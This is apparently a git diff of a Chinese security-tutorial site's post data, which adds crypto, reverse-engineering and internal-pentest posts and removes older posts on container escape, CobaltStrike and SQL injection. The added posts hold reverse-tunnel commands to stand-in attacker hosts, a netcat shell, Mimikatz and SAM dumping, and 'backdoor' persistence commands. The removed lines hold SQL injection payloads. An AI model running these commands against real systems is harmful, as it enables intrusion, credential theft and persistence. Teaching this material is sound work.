@@ -114,6 +114,49 @@ export const categories = [
       { id: 'container-escape', name: '容器逃逸' },
     ]
   },
+  {
+    id: 'crypto',
+    name: '密码学',
+    icon: '🔐',
+    children: [
+      { id: 'crypto-basic', name: '密码学基础' },
+      { id: 'hash-crack', name: '哈希与破解' },
+      { id: 'symmetric-crypto', name: '对称加密' },
+      { id: 'asymmetric-crypto', name: '非对称加密' },
+    ]
+  },
+  {
+    id: 're',
+    name: '逆向工程',
+    icon: '🔬',
+    children: [
+      { id: 're-basic', name: '逆向基础' },
+      { id: 'x86-asm', name: 'x86 汇编' },
+      { id: 'ida-pro', name: 'IDA Pro 使用' },
+      { id: 'ghidra', name: 'Ghidra 使用' },
+    ]
+  },
+  {
+    id: 'internal',
+    name: '内网渗透',
+    icon: '🌐',
+    children: [
+      { id: 'internal-recon', name: '内网信息收集' },
+      { id: 'proxy-tunnel', name: '代理与隧道' },
+      { id: 'internal-post', name: '后渗透' },
+      { id: 'apt', name: 'APT 攻击' },
+    ]
+  },
+  {
+    id: 'securedev',
+    name: '安全开发',
+    icon: '💻',
+    children: [
+      { id: 'secure-coding', name: '安全编码规范' },
+      { id: 'devsecops', name: 'DevSecOps' },
+      { id: 'sast-dast', name: 'SAST/DAST' },
+    ]
+  },
 ]
 
 export const posts = [
@@ -2728,1669 +2771,1193 @@ trivy image nginx:latest
 5. 特权提升
     `
   },
+  // 密码学
   {
-    slug: 'container-escape',
-    title: '容器逃逸技术',
-    date: '2026-06-06',
-    category: 'cloud',
-    subcategory: 'container-escape',
-    tags: ['云安全', '容器逃逸', '渗透测试'],
-    summary: '容器逃逸的常见方法和利用。',
+    slug: 'crypto-basics',
+    title: '密码学基础',
+    date: '2026-06-20',
+    category: 'crypto',
+    subcategory: 'crypto-basic',
+    tags: ['密码学', '基础', 'CTF'],
+    summary: '密码学基本概念和常见加密方式。',
     content: `
-## 什么是容器逃逸
+## 密码学分类
 
-容器逃逸是指从容器环境突破隔离，获得宿主机权限。
+### 对称加密
+加密和解密使用相同密钥。
 
-## 逃逸方法
+### 非对称加密
+使用公钥加密，私钥解密。
 
-### 1. 特权容器逃逸
+### 哈希函数
+单向加密，不可逆。
 
+## 常见编码
+
+### Base64
 \`\`\`bash
-# 检查是否特权
-cat /proc/1/status | grep CapEff
-
-# 挂载宿主机磁盘
-mkdir /tmp/host
-mount /dev/sda1 /tmp/cat /tmp/host/etc/shadow
+echo "hello" | base64
+echo "aGVsbG8=" | base64 -d
 \`\`\`
 
-### 2. Docker Socket 挂载
-
-\`\`\`bash
-# 检查是否有docker.sock
-ls -la /var/run/docker.sock
-
-# 使用docker命令
-docker run -v /:/host alpine chroot /host
+### URL编码
+\`\`\`
+空格 → %20
+< → %3C
+> → %3E
 \`\`\`
 
-### 3. CVE-2019-5736
-
-\`\`\`bash
-# runc漏洞
-# 覆盖runc二进制文件
+### Hex编码
+\`\`\`
+48656c6c6f → Hello
 \`\`\`
 
-### 4. CVE-2020-15257
-
-\`\`\`bash
-# containerd漏洞
-# 通过containerd-shim逃逸
+### ROT13
+\`\`\`
+hello → uryyb
 \`\`\`
 
-### 5. _procfs 逃逸
-
-\`\`\`bash
-# 挂载/proc
-mount -t proc proc /proc
-
-# 获取宿主机进程信息
+### 二进制
+\`\`\`
+01001000 01100101 01101100 01101100 01101111 → Hello
 \`\`\`
 
-### 6. cgroup 逃逸
+## CTF 常见
 
-\`\`\`bash
-# 利用cgroup执行命令
 \`\`\`
-
-## 检测方法
-
-\`\`\`bash
-# 检查容器逃逸痕迹
-cat /proc/1/cgroup
-ls -la /proc/1/ns/
-
-# 检查挂载点
-mount | grep -v "overlay|proc|sys|dev"
+Base64 → Base32 → Base16
+URL编码
+HTML实体编码
+Unicode编码
+UUencode
+XXencode
 \`\`\`
-
-## 防御方案
-
-1. 不使用特权容器
-2. 不挂载Docker Socket
-3. 使用只读文件系统
-4. 限制容器能力
-5. 定期更新容器运行时
-
-## 工具
-
-- **CDK**：容器渗透工具
-- **Breach**：容器安全审计
-- **Deepce**：容器枚举
-     `
+    `
   },
   {
-    slug: 'cobaltstrike-guide',
-    title: 'CobaltStrike 使用指南',
-    date: '2026-05-25',
-    category: 'tools',
-    subcategory: 'cobaltstrike',
-    tags: ['工具', 'CobaltStrike', '红队', 'C2'],
-    summary: 'CobaltStrike 红队 C2 框架基础使用。',
+    slug: 'hash-cracking',
+    title: '哈希与破解',
+    date: '2026-06-18',
+    category: 'crypto',
+    subcategory: 'hash-crack',
+    tags: ['密码学', '哈希', '破解'],
+    summary: '常见哈希算法和破解方法。',
     content: `
-## CobaltStrike 简介
+## 常见哈希算法
 
-CobaltStrike 是商业级渗透测试平台，提供 C2（Command and Control）能力。
+| 算法 | 输出长度 | 特点 |
+|------|----------|------|
+| MD5 | 128位 | 已不安全 |
+| SHA-1 | 160位 | 已不安全 |
+| SHA-256 | 256位 | 安全 |
+| SHA-512 | 512位 | 安全 |
 
-## 核心功能
-
-### Listeners（监听器）
-- HTTP/HTTPS Beacon
-- DNS Beacon
-- SMB Beacon
-- TCP Beacon
-
-### Attacks（攻击）
-- Web Drive-by（钓鱼网站）
-- Spear Phishing（钓鱼邮件）
-- Payload 生成
-
-### Host（主机管理）
-- Beacon 管理
-- 文件管理
-- 键盘记录
-- 截屏
-
-## 基础操作
-
-### 生成 Payload
+## 哈希识别
 
 \`\`\`
-Attacks → Payload Generation → Windows Executable
+MD5: 32位16进制
+SHA-1: 40位16进制
+SHA-256: 64位16进制
 \`\`\`
 
-### 设置监听器
+## 在线破解
+
+- https://crackstation.net/
+- https://hashes.com/
+- https://www.cmd5.com/
+
+## 离线破解
+
+### Hashcat
+
+\`\`\`bash
+# MD5
+hashcat -m 0 hash.txt wordlist.txt
+
+# SHA-1
+hashcat -m 100 hash.txt wordlist.txt
+
+# SHA-256
+hashcat -m 1400 hash.txt wordlist.txt
+
+# NTLM
+hashcat -m 1000 hash.txt wordlist.txt
+\`\`\`
+
+### John the Ripper
+
+\`\`\`bash
+# 自动识别
+john hash.txt
+
+# 指定格式
+john --format=raw-md5 hash.txt
+
+# 使用字典
+john --wordlist=passwords.txt hash.txt
+\`\`\`
+
+## 密码字典
+
+- rockyou.txt
+- SecLists
+- PayloadsAllTheThings
+    `
+  },
+  {
+    slug: 'symmetric-crypto',
+    title: '对称加密详解',
+    date: '2026-06-15',
+    category: 'crypto',
+    subcategory: 'symmetric-crypto',
+    tags: ['密码学', '对称加密', 'AES', 'DES'],
+    summary: '常见对称加密算法和攻击方法。',
+    content: `
+## 常见算法
+
+### DES
+- 密钥长度：56位
+- 分组长度：64位
+- 已不安全
+
+### 3DES
+- 密钥长度：168位
+- 已不安全
+
+### AES
+- 密钥长度：128/192/256位
+- 分组长度：128位
+- 目前安全
+
+## 加密模式
+
+### ECB（电子密码本）
+- 明文分组独立加密
+- 相同明文产生相同密文
+- 不安全
+
+### CBC（密码块链接）
+- 需要初始化向量（IV）
+- 前一个密文块与下一个明文异或
+- 常用
+
+### CTR
+- 将计数器加密后与明文异或
+- 可并行处理
+
+## 常见攻击
+
+### ECB 模式攻击
+\`\`\`
+# 相同明文块产生相同密文块
+# 可进行重放攻击
+\`\`\`
+
+### Padding Oracle
+\`\`\`
+# 利用填充错误信息
+# 逐字节解密
+\`\`\`
+
+### IV 重用
+\`\`\`
+# 相同IV加密相同密文
+# 可进行异或攻击
+\`\`\`
+
+## CTF 工具
+
+\`\`\`python
+from Crypto.Cipher import AES
+
+# AES 解密
+cipher = AES.new(key, AES.MODE_CBC, iv)
+plaintext = cipher.decrypt(ciphertext)
+\`\`\`
+    `
+  },
+  {
+    slug: 'asymmetric-crypto',
+    title: '非对称加密详解',
+    date: '2026-06-12',
+    category: 'crypto',
+    subcategory: 'asymmetric-crypto',
+    tags: ['密码学', 'RSA', '非对称加密'],
+    summary: 'RSA 等非对称加密算法原理和攻击方法。',
+    content: `
+## RSA 算法
+
+### 原理
+1. 选择两个大质数 p, q
+2. 计算 n = p * q
+3. 计算 φ(n) = (p-1)(q-1)
+4. 选择 e 使 gcd(e, φ(n)) = 1
+5. 计算 d 使 e*d ≡ 1 (mod φ(n))
+6. 公钥 (e, n)，私钥 (d, n)
+
+### 加解密
+\`\`\`
+加密：c = m^e mod n
+解密：m = c^d mod n
+\`\`\`
+
+## RSA 攻击
+
+### 小公钥指数攻击
+\`\`\`
+# e 很小时，m^e < n
+# 直接开 e 次方根
+\`\`\`
+
+### 共模攻击
+\`\`\`
+# 相同 n，不同 e 加密相同明文
+\`\`\`
+
+### 因数分解
+\`\`\`
+# 分解 n = p * q
+# 使用 yafu、msieve、factordb.com
+\`\`\`
+
+### Wiener 攻击
+\`\`\`
+# d 很小时
+# 使用连分数攻击
+\`\`\`
+
+### Coppersmith 攻击
+\`\`\`
+# 已知明文部分
+\`\`\`
+
+## CTF 工具
+
+\`\`\`python
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP
+
+# 读取公钥
+key = RSA.import_key(open('pub.pem').read())
+
+# 解密
+cipher = PKCS1_OAEP.new(key)
+plaintext = cipher.decrypt(ciphertext)
+\`\`\`
+    `
+  },
+  // 逆向工程
+  {
+    slug: 're-basics',
+    title: '逆向工程基础',
+    date: '2026-06-17',
+    category: 're',
+    subcategory: 're-basic',
+    tags: ['逆向工程', '基础', 'CTF'],
+    summary: '逆向工程基本概念和常用工具。',
+    content: `
+## 什么是逆向工程
+
+逆向工程是分析程序二进制代码，理解其功能和逻辑的过程。
+
+## 逆向流程
+
+1. **识别文件类型**
+2. **静态分析**
+3. **动态调试**
+4. **代码分析**
+5. **编写脚本**
+
+## 文件类型识别
+
+\`\`\`bash
+file target              # Linux
+binwalk target           # 检查嵌入文件
+strings target           # 提取字符串
+xxd target | head        # 十六进制查看
+\`\`\`
+
+## PE 文件结构（Windows）
 
 \`\`\`
-Cobalt Strike → Listeners → Add
+┌─────────────────┐
+│ DOS Header      │
+├─────────────────┤
+│ PE Header       │
+├─────────────────┤
+│ Section Table   │
+├─────────────────┤
+│ .text           │ ← 代码段
+│ .data           │ ← 数据段
+│ .rdata          │ ← 只读数据
+│ .rsrc           │ ← 资源
+└─────────────────┘
 \`\`\`
 
-### 执行 Payload
-将生成的可执行文件在目标机器上运行。
-
-### 交互命令
+## ELF 文件结构（Linux）
 
 \`\`\`
-shell cmd.exe           # 执行命令
-download file           # 下载文件
-upload file             # 上传文件
-keylogger               # 键盘记录
-screenshot              # 截屏
-hashdump                # 获取哈希
+┌─────────────────┐
+│ ELF Header      │
+├─────────────────┤
+│ Program Header  │
+├─────────────────┤
+│ .text           │ ← 代码段
+│ .data           │ ← 数据段
+│ .bss            │ ← 未初始化数据
+│ .rodata         │ ← 只读数据
+└─────────────────┘
+\`\`\`
+
+## 常用工具
+
+| 工具 | 用途 |
+|------|------|
+| IDA Pro | 反汇编分析 |
+| Ghidra | 反编译 |
+| x64dbg | 动态调试 |
+| OllyDbg | 动态调试 |
+| Radare2 | 逆向框架 |
+| Binary Ninja | 二进制分析 |
+
+## 常见混淆
+
+- 代码混淆
+- 控制流平坦化
+- 虚拟机保护
+- 加壳
+    `
+  },
+  {
+    slug: 'x86-assembly',
+    title: 'x86 汇编基础',
+    date: '2026-06-14',
+    category: 're',
+    subcategory: 'x86-asm',
+    tags: ['逆向工程', '汇编', 'x86'],
+    summary: 'x86 汇编语言基础指令和寄存器。',
+    content: `
+## 寄存器
+
+### 通用寄存器
+| 寄存器 | 用途 |
+|--------|------|
+| EAX | 累加器，返回值 |
+| EBX | 基址寄存器 |
+| ECX | 计数器 |
+| EDX | 数据寄存器 |
+| ESI | 源索引 |
+| EDI | 目标索引 |
+| ESP | 栈指针 |
+| EBP | 基址指针 |
+
+### 段寄存器
+- CS：代码段
+- DS：数据段
+- SS：栈段
+- ES/FS/GS：附加段
+
+## 基本指令
+
+### 数据传送
+\`\`\`asm
+mov eax, ebx      ; eax = ebx
+push eax           ; 压栈
+pop ebx            ; 出栈
+lea eax, [ebx+8]  ; eax = ebx + 8
+\`\`\`
+
+### 算术运算
+\`\`\`asm
+add eax, 1        ; eax += 1
+sub eax, 1        ; eax -= 1
+imul eax, ebx     ; eax *= ebx
+idiv ebx          ; eax /= ebx
+\`\`\`
+
+### 逻辑运算
+\`\`\`asm
+and eax, 0xff     ; 按位与
+or eax, 0x10      ; 按位或
+xor eax, eax      ; 清零
+not eax           ; 取反
+shl eax, 2        ; 左移
+shr eax, 2        ; 右移
+\`\`\`
+
+### 比较和跳转
+\`\`\`asm
+cmp eax, ebx      ; 比较
+je label          ; 相等跳转
+jne label         ; 不相等跳转
+jg label          ; 大于跳转
+jl label          ; 小于跳转
+jmp label         ; 无条件跳转
+call function     ; 调用函数
+ret               ; 返回
+\`\`\`
+
+## 函数调用
+
+\`\`\`
+┌─────────────────┐
+│ 参数            │
+├─────────────────┤
+│ 返回地址        │
+├─────────────────┤
+│ 旧EBP          │ ← EBP
+├─────────────────┤
+│ 局部变量        │
+└─────────────────┘ ← ESP
+\`\`\`
+
+## IDA 快捷键
+
+- F5：反编译
+- Space：图形视图
+- N：重命名
+- X：交叉引用
+- G：跳转
+- ;：添加注释
+    `
+  },
+  {
+    slug: 'ida-pro-guide',
+    title: 'IDA Pro 使用指南',
+    date: '2026-06-11',
+    category: 're',
+    subcategory: 'ida-pro',
+    tags: ['逆向工程', 'IDA', '工具'],
+    summary: 'IDA Pro 反汇编工具使用指南。',
+    content: `
+## IDA Pro 简介
+
+IDA Pro 是最强大的反汇编工具，支持多种架构。
+
+## 基本操作
+
+### 快捷键
+
+| 快捷键 | 功能 |
+|--------|------|
+| F5 | 反编译为伪代码 |
+| Space | 图形/文本视图切换 |
+| N | 重命名变量/函数 |
+| X | 查看交叉引用 |
+| G | 跳转到地址 |
+| ; | 添加注释 |
+| Tab | 切换视图 |
+
+### 常用窗口
+
+- **IDA View**：反汇编视图
+- **Hex View**：十六进制视图
+- **Strings**：字符串窗口
+- **Functions**：函数列表
+- **Imports**：导入表
+- **Exports**：导出表
+
+## 分析流程
+
+1. **查看字符串**：Shift+F12
+2. **定位 main 函数**
+3. **分析关键函数**
+4. **跟踪数据流**
+5. **理解算法逻辑**
+
+## 脚本编写
+
+### IDAPython
+
+\`\`\`python
+import idaapi
+import idc
+
+# 获取当前地址
+addr = idc.here()
+
+# 获取函数名
+func_name = idc.get_func_name(addr)
+
+# 遍历所有函数
+for func_ea in Functions():
+    print(idc.get_func_name(func_ea))
+\`\`\`
+
+### 常用脚本
+
+\`\`\`python
+# 批量重命名
+import idautils
+for func_ea in idautils.Functions():
+    name = idc.get_func_name(func_ea)
+    if "sub_" in name:
+        idc.set_name(func_ea, "func_" + hex(func_ea))
+\`\`\`
+    `
+  },
+  {
+    slug: 'ghidra-guide',
+    title: 'Ghidra 使用指南',
+    date: '2026-06-09',
+    category: 're',
+    subcategory: 'ghidra',
+    tags: ['逆向工程', 'Ghidra', 'NSA'],
+    summary: 'Ghidra 开源逆向工具使用指南。',
+    content: `
+## Ghidra 简介
+
+Ghidra 是 NSA 开发的开源逆向工程工具，支持反编译。
+
+## 安装
+
+\`\`\`bash
+# 下载
+wget https://ghidra-sre.org/ghidra_11.0_PUBLIC_20240130.zip
+
+# 解压
+unzip ghidra_*.zip
+
+# 运行
+./ghidra_*/ghidraRun
+\`\`\`
+
+## 基本操作
+
+### 快捷键
+
+| 快捷键 | 功能 |
+|--------|------|
+| L | 重命名 |
+| Ctrl+E | 编辑函数签名 |
+| G | 跳转到地址 |
+| X | 交叉引用 |
+| 双击 | 跳转 |
+
+### 常用窗口
+
+- **Listing**：反汇编视图
+- **Decompiler**：反编译视图
+- **Symbol Tree**：符号树
+- **Data Type Manager**：数据类型
+
+## 反编译
+
+1. 导入二进制文件
+2. 自动分析
+3. 找到目标函数
+4. 查看反编译结果
+
+## 脚本编写
+
+### Java 脚本
+
+\`\`\`java
+import ghidra.program.model.listing.*;
+import ghidra.app.script.GhidraScript;
+
+public class MyScript extends GhidraScript {
+    @Override
+    public void run() {
+        Listing listing = currentProgram.getListing();
+        // 分析代码
+    }
+}
+\`\`\`
+
+## Ghidra vs IDA
+
+| 特性 | Ghidra | IDA |
+|------|--------|-----|
+| 价格 | 免费 | 商业 |
+| 反编译 | 内置 | 需插件 |
+| 架构支持 | 多 | 多 |
+| 插件生态 | 一般 | 丰富 |
+    `
+  },
+  // 内网渗透
+  {
+    slug: 'internal-recon',
+    title: '内网信息收集',
+    date: '2026-06-16',
+    category: 'internal',
+    subcategory: 'internal-recon',
+    tags: ['内网渗透', '信息收集', '横向'],
+    summary: '内网环境信息收集方法和工具。',
+    content: `
+## 本机信息
+
+\`\`\`bash
+# 系统信息
+systeminfo
+uname -a
+
+# 网络信息
+ipconfig /all
+ifconfig -a
+
+# 用户信息
+whoami /all
+net user
+\`\`\`
+
+## 网络环境
+
+\`\`\`bash
+# 路由表
+route print
+ip route
+
+# ARP 表
+arp -a
+
+# 网络连接
+netstat -ano
+ss -antlp
+\`\`\`
+
+## 域环境
+
+\`\`\`powershell
+# 域信息
+nltest /dclist:domain.com
+net config workstation
+net user /domain
+net group "Domain Admins" /domain
+\`\`\`
+
+## 扫描工具
+
+### fscan
+
+\`\`\`bash
+# 快速扫描
+fscan -h 192.168.1.0/24
+
+# 指定端口
+fscan -h 192.168.1.0/24 -p 80,443,445,3389
+\`\`\`
+
+### CobaltStrike
+
+\`\`\`
+portscan 192.168.1.0/24 80,443,445 arp
+\`\`\`
+
+### Nmap
+
+\`\`\`bash
+nmap -sn 192.168.1.0/24
+nmap -sV -p 80,443,445,3389 192.168.1.0/24
+\`\`\`
+
+## 敏感信息
+
+\`\`\`bash
+# 浏览器密码
+# WiFi密码
+# 文件共享
+# 打印机
+# 邮件服务器
+\`\`\`
+    `
+  },
+  {
+    slug: 'proxy-tunnel',
+    title: '代理与隧道技术',
+    date: '2026-06-14',
+    category: 'internal',
+    subcategory: 'proxy-tunnel',
+    tags: ['内网渗透', '代理', '隧道'],
+    summary: '内网穿透代理和隧道技术。',
+    content: `
+## 代理工具
+
+### ProxyChains
+
+\`\`\`bash
+# 配置 /etc/proxychains4.conf
+socks5 127.0.0.1 1080
+
+# 使用
+proxychains nmap -sV target.com
+\`\`\`
+
+### SocksDroid（安卓）
+
+### Proxifier（Windows/Mac）
+
+## 隧道工具
+
+### SSH 隧道
+
+\`\`\`bash
+# 本地转发
+ssh -L 8080:internal-host:80 user@jump-server
+
+# 远程转发
+ssh -R 8080:localhost:80 user@attacker
+
+# 动态转发（SOCKS代理）
+ssh -D 1080 user@jump-server
+\`\`\`
+
+### FRP
+
+\`\`\`ini
+# frpc.ini
+[common]
+server_addr = attacker.com
+server_port = 7000
+
+[ssh]
+type = tcp
+local_ip = 127.0.0.1
+local_port = 22
+remote_port = 6000
+\`\`\`
+
+### ngrok
+
+\`\`\`bash
+ngrok http 8080
+\`\`\`
+
+### Chisel
+
+\`\`\`bash
+# 服务端
+chisel server --reverse
+
+# 客户端
+chisel client attacker.com:8080 R:socks
+\`\`\`
+
+## 端口转发
+
+\`\`\`bash
+# netcat
+nc -lvp 8080 -e /bin/sh
+nc attacker 8080
+
+# socat
+socat TCP-LISTEN:8080,fork TCP:internal:80
+\`\`\`
+
+## DNS 隧道
+
+\`\`\`bash
+# iodine
+iodined -f tunnel.domain.com
+iodine tunnel.domain.com
+\`\`\`
+    `
+  },
+  {
+    slug: 'internal-post',
+    title: '后渗透技术',
+    date: '2026-06-12',
+    category: 'internal',
+    subcategory: 'internal-post',
+    tags: ['内网渗透', '后渗透', '持久化'],
+    summary: '获取初始访问后的后渗透技术。',
+    content: `
+## 信息收集
+
+\`\`\`powershell
+# 本机信息
+systeminfo
+ipconfig /all
+whoami /all
+net user
+
+# 网络信息
+arp -a
+route print
+netstat -ano
 \`\`\`
 
 ## 权限提升
 
-\`\`\`
-getsystem               # 提权
-bypassuac               # 绕过UAC
-\`\`\`
+### Windows
 
-## 横向移动
+\`\`\`powershell
+# WinPEAS
+winpeas.exe
 
-\`\`\`
-spawn                  # 生成新Beacon
-jump psexec            # PsExec横向
-jump winrm             # WinRM横向
+# 提权漏洞
+systeminfo | findstr KB
 \`\`\`
 
-## 注意事项
-
-- CobaltStrike 是商业软件，需授权使用
-- 仅用于合法渗透测试
-- 注意通信特征检测
-    `
-  },
-  {
-    slug: 'wireshark-guide',
-    title: 'Wireshark 深度分析指南',
-    date: '2026-05-22',
-    category: 'tools',
-    subcategory: 'wireshark-tool',
-    tags: ['工具', 'Wireshark', '流量分析'],
-    summary: 'Wireshark 高级过滤和分析技巧。',
-    content: `
-## 高级过滤
-
-### HTTP 过滤
-
-\`\`\`
-http.request.method == "POST"
-http.request.uri contains "login"
-http.response.code >= 400
-http.cookie contains "session"
-\`\`\`
-
-### TCP 分析
-
-\`\`\`
-tcp.analysis.retransmission    # 重传
-tcp.analysis.zero_window       # 零窗口
-tcp.analysis.duplicate_ack     # 重复ACK
-tcp.flags.reset == 1           # RST包
-\`\`\`
-
-### DNS 分析
-
-\`\`\`
-dns.qry.name contains "malware"
-dns.flags.rcode != 0           # DNS错误
-dns.resp.len > 0               # 有响应
-\`\`\`
-
-### SSL/TLS 分析
-
-\`\`\`
-ssl.handshake.type == 1        # Client Hello
-ssl.handshake.type == 2        # Server Hello
-tls.handshake.extensions_server_name contains "target"
-\`\`\`
-
-## 提取数据
-
-### 导出文件
-
-\`\`\`
-File → Export Objects → HTTP
-File → Export Objects → DICOM
-File → Export Objects → SMB
-\`\`\`
-
-### 提取HTTP流
-
-\`\`\`
-右键 → Follow → HTTP Stream
-\`\`\`
-
-## 统计分析
-
-### 会话统计
-
-\`\`\`
-Statistics → Conversations
-Statistics → Protocol Hierarchy
-Statistics → Endpoints
-\`\`\`
-
-### IO Graph
-
-\`\`\`
-Statistics → I/O Graphs
-\`\`\`
-
-## Tshark 命令行
+### Linux
 
 \`\`\`bash
-# 捕获HTTP POST
-tshark -i eth0 -Y "http.request.method == POST" -T fields -e http.request.uri
+# LinPEAS
+./linpeas.sh
 
-# 提取DNS查询
-tshark -i eth0 -Y "dns.qry.name" -T fields -e dns.qry.name
-
-# 统计IP地址
-tshark -r capture.pcap -T fields -e ip.src | sort | uniq -c | sort -rn
+# SUID 提权
+find / -perm -4000 2>/dev/null
 \`\`\`
 
-## 安全分析
+## 凭据获取
 
-### 检测异常流量
+### Windows
+
+\`\`\`powershell
+# Mimikatz
+mimikatz.exe
+sekurlsa::logonpasswords
+
+# SAM 文件
+reg save HKLM\\SAM sam.hive
+reg save HKLM\\SYSTEM system.hive
+\`\`\`
+
+### 浏览器密码
 
 \`\`\`
-# 大量DNS查询
-dns.qry.name && frame.len > 100
-
-# 可疑HTTP请求
-http.user_agent contains "curl"
-
-# 异常端口
-tcp.port == 4444
+Chrome: %LocalAppData%\\Google\\Chrome\\User Data\\Default\\Login Data
+Firefox: %AppData%\\Mozilla\\Firefox\\Profiles\\
 \`\`\`
 
-### 分析恶意软件
+## 持久化
 
+### 计划任务
+
+\`\`\`powershell
+schtasks /create /tn "backdoor" /tr "C:\\backdoor.exe" /sc minute /mo 1
 \`\`\`
-# C2通信
-tcp.flags.syn == 1 && tcp.flags.ack == 0
-http.request.method == "POST" && http.content_length > 1000
+
+### 服务
+
+\`\`\`powershell
+sc create backdoor binPath= "C:\\backdoor.exe" start= auto
+\`\`\`
+
+### 注册表
+
+\`\`\`powershell
+reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v backdoor /t REG_SZ /d "C:\\backdoor.exe"
 \`\`\`
     `
   },
   {
-    slug: 'tcp-ip-basics',
-    title: 'TCP/IP 基础',
-    date: '2026-06-18',
-    category: 'network',
-    subcategory: 'tcp-ip',
-    tags: ['网络', 'TCP', 'IP', '基础'],
-    summary: 'TCP/IP 四层模型、三次握手、四次挥手详解。',
+    slug: 'apt-attack',
+    title: 'APT 攻击概述',
+    date: '2026-06-08',
+    category: 'internal',
+    subcategory: 'apt',
+    tags: ['APT', '高级威胁', '攻防'],
+    summary: 'APT 攻击技术和常见手法。',
     content: `
-## TCP/IP 四层模型
+## 什么是 APT
 
-| 层 | 协议 |
-|---|---|
-| 应用层 | HTTP, FTP, DNS, SMTP |
-| 传输层 | TCP, UDP |
-| 网络层 | IP, ICMP, ARP |
-| 网络接口层 | Ethernet, Wi-Fi |
+APT（Advanced Persistent Threat）高级持续性威胁，指有组织、有目标的长期攻击。
 
-## 三次握手
+## APT 攻击阶段
 
-1. **SYN** → 客户端发送连接请求
-2. **SYN+ACK** → 服务端确认并回复
-3. **ACK** → 客户端确认，连接建立
+1. **侦查**：目标信息收集
+2. **武器化**：制作恶意载荷
+3. **投递**：钓鱼邮件、水坑攻击
+4. **利用**：漏洞利用
+5. **安装**：植入后门
+6. **C2**：命令控制
+7. **目标达成**：数据窃取
 
-## 四次挥手
+## 常见手法
 
-1. **FIN** → 主动方请求关闭
-2. **ACK** → 被动方确认
-3. **FIN** → 被动方请求关闭
-4. **ACK** → 主动方确认，连接关闭
+### 钓鱼邮件
 
-## 常见端口
-
-\`\`\`
-21 - FTP
-22 - SSH
-23 - Telnet
-25 - SMTP
-53 - DNS
-80 - HTTP
-443 - HTTPS
-3306 - MySQL
-3389 - RDP
-\`\`\`
-    `
-  },
-  {
-    slug: 'http-https-protocol',
-    title: 'HTTP/HTTPS 协议详解',
-    date: '2026-06-15',
-    category: 'network',
-    subcategory: 'http-https',
-    tags: ['网络', 'HTTP', 'HTTPS', '协议'],
-    summary: 'HTTP 请求方法、状态码、HTTPS 加密原理。',
-    content: `
-## HTTP 请求方法
-
-- **GET** - 获取资源
-- **POST** - 提交数据
-- **PUT** - 更新资源
-- **DELETE** - 删除资源
-- **OPTIONS** - 查询支持的方法
-
-## 常见状态码
-
-| 状态码 | 含义 |
-|--------|------|
-| 200 | 成功 |
-| 301 | 永久重定向 |
-| 302 | 临时重定向 |
-| 403 | 禁止访问 |
-| 404 | 未找到 |
-| 500 | 服务器错误 |
-
-## HTTPS 加密流程
-
-1. 客户端发起 HTTPS 请求
-2. 服务端返回证书（公钥）
-3. 客户端验证证书合法性
-4. 客户端生成随机密钥，用公钥加密发送
-5. 服务端用私钥解密得到随机密钥
-6. 双方使用随机密钥进行对称加密通信
-    `
-  },
-  // Web 安全
-  {
-    slug: 'sql-injection',
-    title: 'SQL 注入完全指南',
-    date: '2026-06-20',
-    category: 'websec',
-    subcategory: 'sqli',
-    tags: ['Web安全', 'SQL注入', '渗透测试'],
-    summary: 'SQL 注入原理、分类、检测方法、利用技巧和防御方案。',
-    content: `
-## 什么是 SQL 注入
-
-SQL 注入是通过在输入参数中插入恶意 SQL 语句，使数据库执行非预期操作的攻击方式。攻击者可以绕过认证、窃取数据、甚至控制服务器。
-
-## 注入原理
-
-正常查询：
-\`\`\`sql
-SELECT * FROM users WHERE username='admin' AND password='123456'
-\`\`\`
-
-注入后：
-\`\`\`sql
-SELECT * FROM users WHERE username='admin'--' AND password='anything'
--- 注释掉密码验证，直接登录
-\`\`\`
-
-## 注入分类
-
-### 按注入点分类
-
-| 类型 | 示例 | 特征 |
-|------|------|------|
-| 数字型 | \`?id=1 AND 1=1\` | 无引号包裹 |
-| 字符型 | \`?name=admin' AND '1'='1\` | 单引号包裹 |
-| 搜索型 | \`?keyword=test%' AND '1'='1\` | LIKE 语句 |
-| 布尔型 | \`?id=1' AND (SELECT LENGTH(database()))>5--\` | 条件判断 |
-
-### 按技术分类
-
-#### 联合查询注入（UNION）
-\`\`\`sql
--- 1. 判断字段数
-?id=1' ORDER BY 5--
-?id=1' ORDER BY 3--  -- 报错，说明有3个字段
-
--- 2. 确定回显位置
-?id=1' UNION SELECT 1,2,3--
-
--- 3. 获取数据
-?id=1' UNION SELECT 1,database(),3--
-?id=1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
-?id=1' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'--
-?id=1' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users--
-\`\`\`
-
-#### 报错注入（Error-based）
-\`\`\`sql
--- extractvalue
-?id=1' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--
-
--- updatexml
-?id=1' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
-
--- floor
-?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
-\`\`\`
-
-#### 布尔盲注（Boolean-based）
-\`\`\`sql
--- 判断数据库名长度
-?id=1' AND LENGTH(database())>5--  -- 正常返回
-?id=1' AND LENGTH(database())>10-- -- 错误返回
-
--- 逐字符判断数据库名
-?id=1' AND ASCII(SUBSTR(database(),1,1))>100--
-?id=1' AND ASCII(SUBSTR(database(),1,1))>110--
-\`\`\`
-
-#### 时间盲注（Time-based）
-\`\`\`sql
--- MySQL
-?id=1' AND IF(LENGTH(database())>5,SLEEP(3),0)--
-
--- PostgreSQL
-?id=1'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--
-
--- SQL Server
-?id=1'; IF (1=1) WAITFOR DELAY '0:0:3'--
-\`\`\`
-
-#### 堆叠注入（Stacked Queries）
-\`\`\`sql
-?id=1'; DROP TABLE users;--
-?id=1'; INSERT INTO users VALUES('hacker','123456');--
-\`\`\`
-
-## 常见检测语句
-
-\`\`\`
-' OR 1=1 --
-' OR '1'='1
-" OR "1"="1
-' UNION SELECT 1,2,3 --
-1' AND SLEEP(5) --
-\`\`\`
-
-## 利用流程
-
-1. **判断注入点**：添加单引号、逻辑条件
-2. **判断注入类型**：数字型/字符型
